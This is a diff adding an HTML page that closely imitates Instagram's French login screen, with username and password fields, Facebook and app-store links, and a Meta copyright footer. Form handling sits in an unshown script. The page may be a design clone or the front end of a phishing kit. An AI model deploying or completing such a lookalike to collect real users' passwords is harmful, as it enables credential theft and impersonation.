@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="color-scheme" content="light dark" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>Instagram – Connexion</title>
+  <link rel="stylesheet" href="style.css?v=2" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+
+  <!-- Barre en haut avec logo Instagram et TOUJOURS -->
+  <header class="topbar">
+    <a href="#" class="topbar-logo">
+      <i class="fa-brands fa-instagram"></i>
+      <span>Instagram</span>
+    </a>
+    <span class="topbar-always">TOUJOURS</span>
+  </header>
+
+  <main class="wrapper">
+    
+
+    <!-- Section login -->
+    <section class="login-section">
+      <!-- Carte principale -->
+      <div class="card">
+        <!-- Logo -->
+        <div class="logo">
+          <i class="fa-brands fa-instagram logo-icon"></i>
+        </div>
+
+        <!-- Formulaire -->
+        <form id="loginForm" novalidate>
+          <!-- Champ Email -->
+          <div class="input-group">
+            <input
+              type="text"
+              id="email"
+              name="email"
+              placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail"
+              autocomplete="off"
+              required
+              aria-describedby="emailError"
+            />
+            <i class="fa-solid fa-circle-check input-status success" aria-hidden="true"></i>
+            <i class="fa-solid fa-circle-exclamation input-status error" aria-hidden="true"></i>
+          </div>
+          <p class="error-message" id="emailError" role="alert"></p>
+
+          <!-- Champ Mot de passe -->
+          <div class="input-group">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Mot de passe"
+              autocomplete="current-password"
+              required
+              aria-describedby="passwordError"
+            />
+            <button type="button" class="toggle-password" aria-label="Afficher le mot de passe" tabindex="0">
+              <i class="fa-regular fa-eye" aria-hidden="true"></i>
+            </button>
+            <i class="fa-solid fa-circle-check input-status success" aria-hidden="true"></i>
+            <i class="fa-solid fa-circle-exclamation input-status error" aria-hidden="true"></i>
+          </div>
+          <p class="error-message" id="passwordError" role="alert"></p>
+
+          <!-- Bouton Connexion -->
+          <button type="submit" class="btn-primary" id="loginBtn" disabled>
+            <span class="btn-text">Se connecter</span>
+            <span class="btn-loader" aria-hidden="true">
+              <span class="spinner"></span>
+            </span>
+          </button>
+        </form>
+
+        <!-- Séparateur -->
+        <div class="divider">
+          <span>OU</span>
+        </div>
+
+        <!-- Lien Facebook -->
+        <a href="#" class="forgot-link">
+          <i class="fa-brands fa-facebook" aria-hidden="true"></i>
+          Connectez-vous avec Facebook
+        </a>
+      </div>
+
+      <!-- App download -->
+      <div class="app-download">
+        <p>Téléchargez l'application.</p>
+        <div class="app-badges">
+          <a href="#" class="app-badge" aria-label="App Store">
+            <i class="fa-brands fa-apple"></i>
+            <div class="badge-text">
+              <span class="badge-small">Télécharger sur l'</span>
+              <span class="badge-large">App Store</span>
+            </div>
+          </a>
+          <a href="#" class="app-badge" aria-label="Google Play">
+            <i class="fa-brands fa-google-play"></i>
+            <div class="badge-text">
+              <span class="badge-small">Disponible sur</span>
+              <span class="badge-large">Google Play</span>
+            </div>
+          </a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-langs">
+      <a href="#">Français</a>
+      <a href="#">English</a>
+      <a href="#">Español</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Italiano</a>
+      <a href="#">Português</a>
+      <a href="#">日本語</a>
+      <a href="#">한국어</a>
+    </div>
+    <div class="footer-links">
+      <a href="#">À propos</a>
+      <a href="#">Aide</a>
+      <a href="#">Presse</a>
+      <a href="#">API</a>
+      <a href="#">Emplois</a>
+      <a href="#">Confidentialité</a>
+      <a href="#">Conditions</a>
+      <a href="#">Lieux</a>
+      <a href="#">Langue</a>
+    </div>
+    <div class="footer-bottom">
+      <span>&copy; 2026 Instagram from Meta</span>
+    </div>
+  </footer>
+
+  <script src="script.js?v=2"></script>
+</body>
+</html>
